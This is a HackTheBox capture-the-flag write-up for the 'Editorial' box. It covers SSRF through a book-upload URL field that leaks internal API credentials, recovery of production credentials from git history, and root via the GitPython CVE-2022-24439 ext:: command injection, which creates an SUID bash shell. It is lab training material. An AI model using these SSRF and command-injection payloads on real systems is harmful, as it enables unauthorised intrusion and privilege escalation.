---
layout: post
title: "HTB: Editorial"
box: editorial
img: /img/editorial/editorial
author: Andrew Cherney
date: 2024-10-19
tags: htb easy-box ssrf linux git python cve
icon: "assets/icons/editorial.png"
post_description: "Quick 3 parter of simple easy box tropes. Entry with some SSRF, pivot with git logs, and code exploitation for root."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
nmap -sC 10.129.76.213

Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-19 00:10 CDT
Nmap scan report for 10.129.76.213
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://editorial.htb
```

```bash
dirsearch -u editorial.htb

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/Season5/Editorial/reports/_editorial.htb/_24-06-19_00-11-40.txt

Target: http://editorial.htb/

[00:11:40] Starting: 
[00:11:57] 200 -    3KB - /about
[00:13:15] 200 -    7KB - /upload

Task Completed

```

```bash
ffuf -w /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://editorial.htb -H "Host: FUZZ.editorial.htb" -mc 200,401

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://editorial.htb
 :: Wordlist         : FUZZ: /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.editorial.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,401
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 573 req/sec :: Duration: [0:03:39] :: Errors: 0 ::
```

{% include img_link src="/img/editorial/editorial_front_page" alt="front_page" ext="png" trunc=600 %}

![editorial about page]({{ page.img }}_about_page.png)

An interesting leaked domain from the email address here "submissions@tiempoarriba.htb". I fuzzed for subdomains and directories and it seemed to only redirect to this main domain.

![book upload page]({{ page.img }}_upload_page.png)

There are many fields that we can test here. And after learning this form is sent to a void that I cannot interact with the fields that we can hone in on are the URL and file upload parts.

I'll do a quick OOB test for the url by placing my IP.

```bash
httpserver

Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.76.213 - - [19/Jun/2024 00:26:25] code 404, message File not found
10.129.76.213 - - [19/Jun/2024 00:26:25] "GET /test HTTP/1.1" 404 -
```

I made a test.php file with some basic code, it properly embedded but no extension nor code, but there is an important lesson here that any file or url previewed will embed in an img tag with a created file on the backend following the formula:

```html
<img style="width: 70%; border-radius: 3px;" id="bookcover" src="static/uploads/1cbc33cd-3410-4964-a576-9d02ed5200b8">
```

Check if I can upload an image and it render.

![banana]({{ page.img }}_image_upload_test.png)

# User as dev

## SSRF

Okay at this point we have exhausted the default functionality of this site, time to fuzz this URL parameter. We have already seen that I can get an OOB request to a hosted server, and I can probably do some SSRF as well given the lack of a filter. 

![SSRF burp check]({{ page.img }}_burp_ssrf_check.png)

There's a response but that image doesn't give any info. I'll fuzz common ports with intruder and check for alternate responses.

![intruder burp ssrf port scan]({{ page.img }}_ssrf_scan.png)

Port 5000 has a different response created. My hunch is that there is data at that endpoint to read as opposed to the closed ports I was fuzzing that gave the same "empty" response.  

![SSRF port 5000 request]({{ page.img }}_ssrf_5000_send.png)

![SSRF port 5000 success]({{ page.img }}_ssrf_5000_check.png)

This looks to be a blog on the backend for development purposes. After reading through the api endpoints given to us I find leaked credentials to a dev account:

```
/api/latest/metadata/messages/authors

{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}

dev:dev080217_devAPI!@
```

```bash
ssh dev@10.129.76.213

The authenticity of host '10.129.76.213 (10.129.76.213)' can't be established.
ECDSA key fingerprint is SHA256:vD0RRLKSdq+ahh96RLgD4c6th30+PC391OHKI6SWlhY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.76.213' (ECDSA) to the list of known hosts.
dev@10.129.76.213's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)
...
Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
dev@editorial:~$ cat user.txt 
f10434ba463d--------------------
```

# Pivot to Prod

## Git logs

```bash
dev@editorial:~$ ls -al

total 32
drwxr-x--- 4 dev  dev  4096 Jun  5 14:36 .
drwxr-xr-x 4 root root 4096 Jun  5 14:36 ..
drwxrwxr-x 3 dev  dev  4096 Jun  5 14:36 apps
lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -> /dev/null
-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 dev  dev  3771 Jan  6  2022 .bashrc
drwx------ 2 dev  dev  4096 Jun  5 14:36 .cache
-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile
-rw-r----- 1 root dev    33 Jun 16 18:27 user.txt
dev@editorial:~$ ls -al apps/
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git
```

There is a git repo for the app, perhaps we can find some hard coded passwords in commits.

```bash
dev@editorial:~/apps$ git log

commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
    
    * This contains the base of this project.
    * Also we add a feature to enable to external authors send us their
       books and validate a future post in our editorial.
```

```bash
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
 
prod:080217_Producti0n_2023!@
```

```bash
dev@editorial:~/apps$ su prod

Password: 
prod@editorial:/home/dev/apps$ 
```


# Root

## gitpython


```bash
prod@editorial:/home/dev/apps$ sudo -l

[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *

prod@editorial:/home/dev/apps$ cat 

/opt/internal_apps/clone_changes/clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

Very little to work with here, only possible vuln would be the git module. I'll check if I can ping a webserver with the git clone request of this script.

```bash
prod@editorial:/tmp/.raccoon$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py http://10.10.14.29:8081/test

Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always http://10.10.14.29:8081/test new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: repository 'http://10.10.14.29:8081/test/' not found
'
```

```bash
httpserver

Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.76.213 - - [19/Jun/2024 01:09:09] code 404, message File not found
10.129.76.213 - - [19/Jun/2024 01:09:09] "GET /test/info/refs?service=git-upload-pack HTTP/1.1" 404 -
```

Starting simple I check for gitpython vulnerabilities. [https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858) labels a way to smuggle commands into a python script accepting user input for gitpython. [CVE-2022-24439](https://www.cve.org/CVERecord?id=CVE-2022-24439) is the specific method.

```
'ext::sh -c touch% /tmp/pwned'
```


```bash
prod@editorial:/tmp/.raccoon$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'

Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c touch% /tmp/pwned new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'

prod@editorial:/tmp/.raccoon$ ls /tmp

pwned
systemd-private-c262a7837fc54dc8b812137b93d07b30-fwupd.service-m4SBz6
systemd-private-c262a7837fc54dc8b812137b93d07b30-ModemManager.service-BOPG1T
systemd-private-c262a7837fc54dc8b812137b93d07b30-systemd-logind.service-A64Qby
systemd-private-c262a7837fc54dc8b812137b93d07b30-systemd-resolved.service-mjPUaI
systemd-private-c262a7837fc54dc8b812137b93d07b30-systemd-timesyncd.service-ozFO0k
systemd-private-c262a7837fc54dc8b812137b93d07b30-upower.service-6X4zaC
vmware-root_797-4257069498
```

After some testing the only nuance of this vulnerability is each non ending argument needs to end with a %

```bash
prod@editorial:/tmp/.raccoon$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cp% /bin/bash% /tmp'

Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c cp% /bin/bash% /tmp new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'

prod@editorial:/tmp/.raccoon$ ls /tmp

bash
pwned
systemd-private-c262a7837fc54dc8b812137b93d07b30-fwupd.service-m4SBz6
systemd-private-c262a7837fc54dc8b812137b93d07b30-ModemManager.service-BOPG1T
systemd-private-c262a7837fc54dc8b812137b93d07b30-systemd-logind.service-A64Qby
systemd-private-c262a7837fc54dc8b812137b93d07b30-systemd-resolved.service-mjPUaI
systemd-private-c262a7837fc54dc8b812137b93d07b30-systemd-timesyncd.service-ozFO0k
systemd-private-c262a7837fc54dc8b812137b93d07b30-upower.service-6X4zaC
vmware-root_797-4257069498
```

Copied bash properly now I can make it an SUID.

```bash
prod@editorial:/tmp/.raccoon$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s% /tmp/bash'

Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c chmod% u+s% /tmp/bash new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'

prod@editorial:/tmp/.raccoon$ ls -al /tmp

total 1424
drwxrwxrwt 15 root root    4096 Jun 19 06:25 .
drwxr-xr-x 18 root root    4096 Jun  5 14:54 ..
-rwsr-xr-x  1 root root 1396520 Jun 19 06:26 bash
drwxrwxrwt  2 root root    4096 Jun 16 18:26 .font-unix
drwxrwxrwt  2 root root    4096 Jun 16 18:26 .ICE-unix
-rw-r--r--  1 root root       0 Jun 19 06:20 pwned
drwxrwxr-x  2 prod prod    4096 Jun 19 06:08 .raccoon
drwx------  3 root root    4096 Jun 19 05:20 systemd-private-c262a7837fc54dc8b812137b93d07b30-fwupd.service-m4SBz6
drwx------  3 root root    4096 Jun 16 18:26 systemd-private-c262a7837fc54dc8b812137b93d07b30-ModemManager.service-BOPG1T
drwx------  3 root root    4096 Jun 16 18:26 systemd-private-c262a7837fc54dc8b812137b93d07b30-systemd-logind.service-A64Qby
drwx------  3 root root    4096 Jun 16 18:26 systemd-private-c262a7837fc54dc8b812137b93d07b30-systemd-resolved.service-mjPUaI
drwx------  3 root root    4096 Jun 16 18:26 systemd-private-c262a7837fc54dc8b812137b93d07b30-systemd-timesyncd.service-ozFO0k
drwx------  3 root root    4096 Jun 17 05:12 systemd-private-c262a7837fc54dc8b812137b93d07b30-upower.service-6X4zaC
drwxrwxrwt  2 root root    4096 Jun 16 18:26 .Test-unix
drwx------  2 root root    4096 Jun 16 18:27 vmware-root_797-4257069498
drwxrwxrwt  2 root root    4096 Jun 16 18:26 .X11-unix
drwxrwxrwt  2 root root    4096 Jun 16 18:26 .XIM-unix
```

```bash
prod@editorial:/tmp/.raccoon$ /tmp/bash -p
bash-5.1# cat /root/root.txt
e76afa22e38b--------------------
```
